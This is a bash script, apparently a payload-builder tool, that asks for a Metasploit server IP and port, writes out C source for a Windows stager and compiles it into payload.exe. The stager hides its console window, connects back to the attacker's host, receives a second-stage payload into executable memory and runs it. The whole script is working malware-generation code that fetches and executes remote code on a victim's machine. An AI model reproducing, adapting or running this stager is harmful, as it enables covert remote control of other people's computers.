#!/bin/bash
clear
echo '
 ____  _   _ ____  _____ _   _    _      ____   ____ 
| __ )| \ | / ___|| ____| \ | |  / \    / ___| / ___|
|  _ \|  \| \___ \|  _| |  \| | / _ \   \___ \| |    
| |_) | |\  |___) | |___| |\  |/ ___ \   ___) | |___ 
|____/|_| \_|____/|_____|_| \_/_/   \_\ |____/ \____|
                                                     

'
echo 'To use this tool you need to install mingw32'
echo 'use "sudo apt-get install mingw32" to install him'
echo 'after you install mingw32 you can use this tool'
echo ''
echo -en 'Metasploit server IP : ' 
read ip
echo -en 'Metasploit port number : ' 
read port 

echo '#include <stdio.h>'> make.c 
echo '#include <stdlib.h>' >> make.c 
echo '#include <windows.h>' >> make.c 
echo '#include <winsock2.h>' >> make.c 
echo -n 'unsigned char server[]="' >> make.c 
echo -n $ip >> make.c 
echo -n '";' >> make.c 
echo '' >> make.c 
echo -n 'unsigned char serverp[]="' >> make.c 
echo -n $port >> make.c 
echo -n '";' >> make.c 
echo '' >> make.c 
echo 'void winsock_init() {' >> make.c 
echo '    WSADATA    wsaData;' >> make.c 
echo '    WORD    wVersionRequested;' >> make.c 
echo '    wVersionRequested = MAKEWORD(2, 2);'>> make.c 
echo '    if (WSAStartup(wVersionRequested, &wsaData) < 0) {' >> make.c 
echo '         printf("ws2_32.dll is out of date.\n"); '>> make.c 
echo '         WSACleanup(); '>> make.c 
echo '        exit(1);'>> make.c 
echo '    }' >> make.c 
echo ' }' >> make.c 
echo ' void punt(SOCKET my_socket, char * error) {' >> make.c 
echo '    printf("Bad things: %s\n", error);'>> make.c 
echo '    closesocket(my_socket);'>> make.c 
echo '    WSACleanup();'>> make.c 
echo '    exit(1);' >> make.c 
echo ' }' >> make.c 
echo ' int recv_all(SOCKET my_socket, void * buffer, int len) {' >> make.c 
echo '    int    tret   = 0;'>> make.c 
echo '    int    nret   = 0;'>>make.c 
echo '    void * startb = buffer;'>> make.c 
echo '    while (tret < len) {'>>make.c 
echo '        nret = recv(my_socket, (char *)startb, len - tret, 0);'>> make.c 
echo '        startb += nret;'>> make.c 
echo '        tret   += nret;'>>make.c 
echo '         if (nret == SOCKET_ERROR)'>> make.c 
echo '            punt(my_socket, "Could not receive data");'>> make.c 
echo '    }'>>make.c 
echo '    return tret;'>> make.c 
echo '}' >> make.c  
echo 'SOCKET wsconnect(char * targetip, int port) {'>> make.c 
echo '    struct hostent *        target;' >> make.c 
echo '    struct sockaddr_in     sock;' >> make.c
echo '    SOCKET             my_socket;'>>make.c 
echo '    my_socket = socket(AF_INET, SOCK_STREAM, 0);'>> make.c 
echo '     if (my_socket == INVALID_SOCKET)'>> make.c 
echo '        punt(my_socket, ".");'>>make.c 
echo '    target = gethostbyname(targetip);'>>make.c 
echo '    if (target == NULL)'>>make.c 
echo '        punt(my_socket, "..");'>>make.c 
echo '    memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);'>>make.c 
echo '    sock.sin_family = AF_INET;'>> make.c 
echo '    sock.sin_port = htons(port);'>>make.c 
echo '    if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )'>>make.c 
echo '         punt(my_socket, "...");'>>make.c  
echo '    return my_socket;'>>make.c 
echo '}' >> make.c 
echo 'int main(int argc, char * argv[]) {' >> make.c 
echo '  FreeConsole();'>>make.c 
echo '    ULONG32 size;'>>make.c 
echo '    char * buffer;'>>make.c 
echo '    void (*function)();'>>make.c 
echo '    winsock_init();'>> make.c 
echo '    SOCKET my_socket = wsconnect(server, atoi(serverp));'>>make.c 
echo '    int count = recv(my_socket, (char *)&size, 4, 0);'>>make.c 
echo '    if (count != 4 || size <= 0)'>>make.c 
echo '        punt(my_socket, "read a strange or incomplete length value\n");'>>make.c 
echo '    buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);'>>make.c 
echo '    if (buffer == NULL)'>>make.c 
echo '        punt(my_socket, "could not allocate buffer\n");'>>make.c 
echo '    buffer[0] = 0xBF;'>>make.c 
echo '    memcpy(buffer + 1, &my_socket, 4);'>>make.c 
echo '    count = recv_all(my_socket, buffer + 5, size);'>>make.c 
echo '    function = (void (*)())buffer;'>>make.c 
echo '    function();'>>make.c 
echo '    return 0;'>>make.c 
echo '}' >> make.c 
echo 'Compiling binary ..' 
i586-mingw32msvc-gcc  make.c -o payload.exe -lws2_32
ls -la payload.exe 
